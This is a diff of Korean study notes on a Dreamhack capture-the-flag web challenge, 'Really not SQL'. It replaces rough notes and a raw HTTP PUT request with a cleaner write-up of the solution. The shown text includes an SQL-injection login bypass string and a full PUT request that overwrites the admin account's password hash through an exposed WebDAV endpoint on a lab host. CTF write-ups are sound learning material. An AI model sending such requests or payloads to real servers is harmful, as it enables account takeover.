@@ -11,29 +11,16 @@ SELECT firstname FROM users WHERE username='admininstrator'-- AND password='1234
 0' AND userid='admin 
 심플.
 
-Really not SQL , JSON
-버프수트 리피터로 보내야돼. PUT으로 method 바꿔서. 그걸로 비번 새걸로 뒤집어쓰는거지.
-DEV 켜져있어서. 글고 비번은 sha256됨.
-METHOND / path HTTP/1.1 이런느낌?
-오글고 request필드 내가 갈아엎었잖아. 이건 http 요청이라 띄어쓰기 기준으로 헤더바디 나뉨. 
-error occured가 어디서뜨는지 찾아
+[Dreamhack] Really not SQL 
+목표) admin 계정 탈취하기.
+코드) login.php 보며 디렉토리, 파일이름 찾음. /user/admin.json 이런식으로 접근하면되겠다.
+또, /user아래 어쩌구.json으로 정보를 관리함을 볼 수 있다. (db를 사용하지 않음!)
+DAV.on 부분이 취약점임. (WebDAV는 서버의 파일을 직접 관리할 수 있게 해주는 프로토콜임. 즉, /user 아래 파일들을 인터넷으로 자유롭게 수정 가능함.)
+풀이) Burpsuite repeater. PUT으로 method 바꿔서.
+request 필드는 http 요청, header/body 내가 직접 바꿔 요청해보는 문제.
+PUT 메소드 : 리소스를 생성/업데이트하기 위해 서버로 데이터를 보내는 데 사용된다. (METHOND / path HTTP/1.1 이런느낌?)
+어느 포인트에서 가로채야하냐: /user/admin.json
+*와 안풀린 이유: 가로채는 포인트가 login.php 아래가 아니라 루트 아래서 했어야했음. json데이터는 body부분에 (젤뒤에) 슬쩍 추가하면됨.
+요약) 일단 주어진 소스코드를 다 보며 경로, 암호화방식, 접근가능한지(session 필요한지), 사용자뭐가있는지등 확인하기. 비번 다른거로 덮어씌우는 문제.
 
-
-PUT /user/admin.json HTTP/1.1
-Host: host8.dreamhack.games:12794
-Content-Type: application/json
-Content-Length: 667
-Connection: keep-alive
-
-{"no":0,"id":"admin","password":"fc8252c8dc55839967c58b9ad755a59b61b67c13227ddae4bd3f78a38bf394f7"}
-Cache-Control: max-age=0
-Accept-Language: ko-KR,ko;q=0.9
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
-Origin: http://host3.dreamhack.games:23321
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://host3.dreamhack.games:23321/login.php
-Accept-Encoding: gzip, deflate, br
-Cookie: PHPSESSID=3ul24k3soevgpgahe5d1p1vods
-Connection: keep-alive
 
